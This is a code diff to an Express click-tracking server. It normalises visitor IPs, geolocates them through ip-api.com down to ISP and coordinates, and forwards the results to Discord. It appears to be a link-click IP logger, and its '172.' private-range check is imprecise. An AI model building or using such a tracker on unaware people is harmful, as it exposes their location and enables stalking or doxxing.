@@ -18,11 +18,23 @@ app.get('/', (req, res) => {
 
 // Utility function to get client IP
 function getClientIP(req) {
-  return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
-         req.connection.remoteAddress || 
-         req.socket.remoteAddress ||
-         req.ip || 
-         'Unknown';
+  let ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
+           req.connection.remoteAddress || 
+           req.socket.remoteAddress ||
+           req.ip || 
+           'Unknown';
+  
+  // Normalize IPv6 addresses
+  // Handle IPv6 localhost (::1)
+  if (ip === '::1') {
+    ip = '127.0.0.1';
+  }
+  // Handle IPv4-mapped IPv6 (::ffff:192.168.1.1)
+  if (ip?.startsWith('::ffff:')) {
+    ip = ip.slice(7);
+  }
+  
+  return ip;
 }
 
 // Endpoint untuk mencatat klik dan informasi browser
@@ -46,20 +58,35 @@ app.post('/api/track-click', (req, res) => {
 
 // Utility function untuk mendapatkan geolocation dari IP
 function fetchGeolocation(ip, clickData, res) {
-  // Skip geolocation untuk localhost
-  if (ip === '127.0.0.1' || ip === 'Unknown' || ip.startsWith('192.168') || ip.startsWith('10.')) {
+  // Skip geolocation untuk localhost dan private IP
+  if (ip === '127.0.0.1' || ip === 'Unknown' || ip === '::1' || 
+      ip.startsWith('192.168') || ip.startsWith('10.') || ip.startsWith('172.')) {
     clickData.geolocation = {
-      country: 'Local',
+      country: 'Local/Private',
       city: 'Localhost',
-      timezone: 'N/A'
+      region: 'N/A',
+      timezone: 'N/A',
+      isp: 'Local Network',
+      organization: 'Local',
+      latitude: 0,
+      longitude: 0
     };
+    console.log(`[Local IP] ${ip} - Using local geolocation`);
     sendToDiscord(clickData, res);
     return;
   }
 
-  axios.get(`https://ip-api.com/json/${ip}?fields=country,city,regionName,timezone,isp,org,lat,lon,query`)
+  console.log(`[GeoIP Lookup] Fetching geolocation for IP: ${ip}`);
+  
+  axios.get(`https://ip-api.com/json/${ip}?fields=country,city,regionName,timezone,isp,org,lat,lon,query,status`)
     .then(response => {
       const geoData = response.data;
+      
+      // Check API response status
+      if (geoData.status !== 'success') {
+        console.warn(`[GeoIP Warning] API returned status: ${geoData.status} for IP: ${ip}`);
+      }
+      
       clickData.geolocation = {
         country: geoData.country || 'Unknown',
         city: geoData.city || 'Unknown',
@@ -71,12 +98,22 @@ function fetchGeolocation(ip, clickData, res) {
         longitude: geoData.lon || 0,
         status: geoData.status
       };
+      
+      console.log(`[GeoIP Success] Country: ${geoData.country}, City: ${geoData.city}, ISP: ${geoData.isp}`);
       sendToDiscord(clickData, res);
     })
     .catch(err => {
-      console.error('Error fetching geolocation:', err.message);
+      console.error(`[GeoIP Error] Failed to fetch geolocation for IP ${ip}:`, err.message);
       clickData.geolocation = {
-        error: 'Geolocation fetch failed'
+        country: 'Error',
+        city: 'N/A',
+        region: 'N/A',
+        timezone: 'N/A',
+        isp: 'N/A',
+        organization: 'N/A',
+        latitude: 0,
+        longitude: 0,
+        error: err.message
       };
       sendToDiscord(clickData, res);
     });
